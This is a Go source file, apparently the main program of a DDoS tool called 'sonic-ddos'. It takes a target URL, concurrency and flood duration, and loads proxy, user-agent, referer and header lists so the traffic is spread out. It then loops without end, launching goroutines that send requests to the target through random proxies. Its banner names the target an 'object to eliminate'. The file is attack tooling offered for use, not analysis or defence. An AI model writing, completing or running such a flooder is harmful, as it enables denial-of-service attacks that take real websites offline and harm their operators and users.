package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
	"gadalubau1337/sonic-ddos/bot"
	"gadalubau1337/sonic-ddos/fancy"
	"gadalubau1337/sonic-ddos/filesystem"
	"gadalubau1337/sonic-ddos/globals"
)

var (
	target      = flag.String("url", "", "Target URL. Examples: https://github.com or http://google.com")
	concurrency = flag.Int("concurrency", 2000, "Defines concurrency across requests")
	duration    = flag.Int("duration", 300, "Flood duration in seconds")
)

func main() {
	cpus := runtime.NumCPU()
	runtime.GOMAXPROCS(cpus)

	rand.Seed(time.Now().Unix())

	logo := fancy.BuildLogo()
	logo.Colorize()

	// lil dirty but who cares
	fmt.Fprint(os.Stdout, *logo)
	fmt.Fprint(os.Stdout, "\r\n   \x1b[1mYour object to eliminate\x1b[0m \x1b[1m\"\x1b[0m\x1b[31mthings\x1b[0m\x1b[1m\"\x1b[0m")
	fmt.Fprint(os.Stdout, "\r\n              \x1b[1m\x1b[38;5;201m@\x1b[38;5;93mGadaLuBau\x1b[0m\n\n")

	fmt.Fprintf(os.Stdout, "\x1b[1m[CPU]\x1b[0m %d - Amount of CPU's reserved for flood\r\n\n", cpus)

	flag.Parse()

	if *target == "" || !strings.Contains(*target, "http://") && !strings.Contains(*target, "https://") {
		log.Fatal("Please satisfy http://domain.com or https://domain.com on flag target")
	}

	base, err := os.Getwd()
	if err != nil {
		log.Fatal(err)
	}

	files := map[string]interface{}{
		"accepts.txt": &globals.ACCEPTS,
		"proxies.txt": &globals.PROXIES,
		"refs.txt":    &globals.REFS,
		"uas.txt":     &globals.UAS,
	}

	for k, v := range files {
		data, err := filesystem.Read(filepath.Join(base, k))
		if err != nil {
			log.Fatal(err)
		}
		*v.(*[]string) = data
	}

	// for i := 0; i < len(files); i++ {
	// 	file := files[i]
	// 	name := strings.Split(file, ".txt")[0]

	// 	data, err := filesystem.Read(filepath.Join(base, file))
	// 	if err != nil {
	// 		log.Fatal(err)
	// 	}
	// 	globals.Table[name] = data
	// }

	bot := &bot.BotClient{
		Target:      *target,
		StopAt:      time.Now().Add(time.Duration(time.Second * time.Duration(*duration))),
		Concurrency: *concurrency,
	}
	for {
		go func() {
			proxy := globals.PROXIES[rand.Intn(len(globals.PROXIES))]
			err := bot.Request(proxy)
			if err != nil {
				fmt.Printf("[ERR]: %s", err)
			}
		}()
	}
}
